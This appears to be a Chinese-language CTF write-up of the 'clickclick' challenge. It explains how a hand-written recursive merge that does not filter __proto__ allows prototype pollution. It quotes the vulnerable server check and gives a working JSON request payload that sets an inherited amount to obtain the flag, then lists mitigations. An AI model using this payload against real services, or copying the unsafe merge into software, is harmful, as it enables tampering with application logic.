# clickclick

## 题目简述

前端每点击 50 次向 `POST /update-amount` 发送 `{type:"set", point:{amount:<计数>}}`。服务端希望拒绝大于等于 1000 的计数，并在 `point.amount` 为 `0` 或 `null` 时删除该自有属性；随后以手写递归 `merge` 合并到全局 `point`，最后仅检查 `point.amount >= 10000`。

该 `merge` 会遍历攻击者对象的 `__proto__`，没有排除原型键。漏洞是原型污染使读取 `point.amount` 时得到继承属性，而前置校验与删除只处理本次请求的自有 `amount`。

## 解题过程

### 关键代码与构造

```js
if (req.body.point.amount >= 1000) return res.status(400).send('你按的太快了！');
if (req.body.point.amount == 0 || req.body.point.amount == null) delete req.body.point.amount;
merge(point, req.body.point);
if (point.amount >= 10000) return res.status(200).send(flag);
```

提交 `amount: 0` 让服务端在 merge 前删除该自有键，同时把继承属性写为目标值：

```http
POST /update-amount
Content-Type: application/json

{"type":"set","point":{"amount":0,"__proto__":{"amount":10000}}}
```

手写 merge 在处理 `__proto__` 时会递归到对象原型并写入 `amount=10000`。之后 `let amount = point.amount` 查找不到自有属性，沿原型链取得 10000，返回 flag。前端“点击一万次”的提示只用于暴露删除分支，实际不必发送非法高计数。

### 验证

先确认正常 `{amount:1000}` 返回“你按的太快了”，再发送上述 JSON，预期同一响应直接为 flag。结论由提供的 `server.cjs` 和已构建前端中的请求格式静态核对；未运行比赛实例。

## 方法总结

- 核心技巧：利用未过滤 `__proto__` 的深合并，让自有属性删除后回退到污染的原型属性。
- 识别信号：手写递归 merge、`for...in`、对 `obj.key` 的后续读取，以及校验与 merge 的先后顺序。
- 复用要点：合并不可信 JSON 时拒绝 `__proto__`、`constructor`、`prototype`，并使用无原型字典或显式自有属性检查。
